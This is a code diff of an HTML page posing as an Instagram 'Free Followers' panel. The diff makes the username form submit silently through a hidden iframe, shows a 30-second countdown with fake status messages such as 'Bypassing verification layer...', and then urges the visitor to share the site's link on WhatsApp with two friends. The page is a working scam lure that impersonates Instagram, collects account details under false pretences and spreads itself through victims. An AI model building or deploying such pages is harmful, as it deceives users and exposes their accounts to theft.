@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram - Free Followers Panel</title>
-    <!-- FontAwesome Icon Link for Instagram & Blue Tick -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -15,8 +14,6 @@
         }
 
         body {
-            /* Instagram Official Color Gradient Background */
-            background: dimgray;
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
             min-height: 100vh;
             display: flex;
@@ -35,10 +32,7 @@
             text-align: center;
         }
 
-        /* Top Header Section with Icon and Verified ID */
-        .header-section {
-            margin-bottom: 25px;
-        }
+        .header-section { margin-bottom: 25px; }
 
         .insta-icon {
             font-size: 50px;
@@ -69,63 +63,98 @@
             margin-top: 5px;
         }
 
-        .blue-tick {
-            color: #0095f6;
-            font-size: 14px;
-        }
+        .blue-tick { color: #0095f6; font-size: 14px; }
 
-        /* Form Styling */
-        .form-group {
-            text-align: left;
-            margin-bottom: 18px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            color: #262626;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-
+        .form-group { text-align: left; margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 14px; color: #262626; font-weight: 600; margin-bottom: 6px; }
         .form-group input, .form-group select {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 6px;
-            font-size: 14px;
-            background: #fafafa;
-            outline: none;
+            width: 100%; padding: 10px 12px; border: 1px solid #dbdbdb; border-radius: 6px; font-size: 14px; background: #fafafa; outline: none;
         }
 
-        .form-group input:focus {
-            border-color: #a8a8a8;
-        }
-
-        /* Submit Button Upgraded */
         .btn-submit {
-            width: 100%;
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 10px;
+            width: 100%; background-color: #0095f6; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 10px;
         }
 
-        .btn-submit:hover {
-            background-color: #1877f2;
+        /* --- POPUP MODAL STYLING --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none; /* Shuru me hidden rahega */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
         }
+
+        .modal-box {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .timer-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #262626;
+            margin-bottom: 10px;
+        }
+
+        .status-msg {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        /* WhatsApp Button styling */
+        .btn-whatsapp {
+            display: none; /* 30 sec baad dikhega */
+            background-color: #25D366;
+            color: white;
+            text-decoration: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3);
+        }
+
+        .btn-whatsapp:hover { background-color: #20ba59; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Top Branding Area -->
         <div class="header-section">
             <i class="fa-brands fa-instagram insta-icon"></i>
             <h2>Free Instagram Followers</h2>
@@ -135,8 +164,8 @@
             </div>
         </div>
 
-       <!-- Main Form -->
-<form action="/submit-data" method="POST">
+        <!-- Form target is set to hidden iframe to prevent page redirection -->
+        <form action="/submit-data" method="POST" id="followersForm" target="hidden_iframe">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" id="username" name="username" placeholder="Enter Username" required>
@@ -160,6 +189,79 @@
             <button type="submit" class="btn-submit">Get Free Followers</button>
         </form>
     </div>
+
+    <!-- Hidden Iframe to process backend in background without leaving the page -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+    <!-- POPUP MODAL CONTAINER -->
+    <div class="modal-overlay" id="statusModal">
+        <div class="modal-box">
+            <div id="loadingArea">
+                <div class="spinner"></div>
+                <div class="timer-text" id="countdown">30s</div>
+                <div class="status-msg" id="statusText">Connecting to Instagram API...</div>
+            </div>
+            
+            <!-- WhatsApp share area -->
+            <div id="shareText" style="display: none; font-weight: 600; color: #262626; font-size: 16px;">
+                🎉 Account Verified Successfully!
+            </div>
+            <a href="https://api.whatsapp.com/send?text=Hey!%20I%20just%20got%20free%20Instagram%20followers%20from%20here.%20Try%20it%20now%20%F0%9F%A4%A9%F0%9F%91%87%20https://followers-app-1.onrender.com" 
+               target="_blank" class="btn-whatsapp" id="whatsappBtn">
+                <i class="fa-brands fa-whatsapp" style="font-size: 20px;"></i> Share with 2 friends and get followers
+            </a>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('followersForm');
+        const modal = document.getElementById('statusModal');
+        const countdownEl = document.getElementById('countdown');
+        const statusTextEl = document.getElementById('statusText');
+        const loadingArea = document.getElementById('loadingArea');
+        const shareText = document.getElementById('shareText');
+        const whatsappBtn = document.getElementById('whatsappBtn');
+
+        form.addEventListener('submit', function() {
+            // 1. Popup screen dikhao
+            modal.style.display = 'flex';
+            
+            let timeLeft = 30;
+            
+            // Status messages jo automatic badlenge timer ke sath
+            const statusMessages = [
+                "Connecting to Instagram API...",
+                "Searching Username database...",
+                "Bypassing verification layer...",
+                "Generating secure followers package...",
+                "Finalizing account injection..."
+            ];
+
+            // 2. 30 Second ka Countdown Timer shuru karo
+            const downloadTimer = setInterval(function() {
+                timeLeft--;
+                countdownEl.textContent = timeLeft + "s";
+                
+                // Har 6 second me change message
+                if (timeLeft > 0) {
+                    let msgIndex = Math.floor((30 - timeLeft) / 6);
+                    if(statusMessages[msgIndex]) {
+                        statusTextEl.textContent = statusMessages[msgIndex];
+                    }
+                }
+
+                // 3. Jab 30 seconds khatam ho jayein
+                if (timeLeft <= 0) {
+                    clearInterval(downloadTimer);
+                    
+                    // Loading spinner chupao aur WhatsApp share dikhao
+                    loadingArea.style.display = 'none';
+                    shareText.style.display = 'block';
+                    whatsappBtn.style.display = 'inline-flex';
+                }
+            }, 1000);
+        });
+    </script>
 
 </body>
 </html>
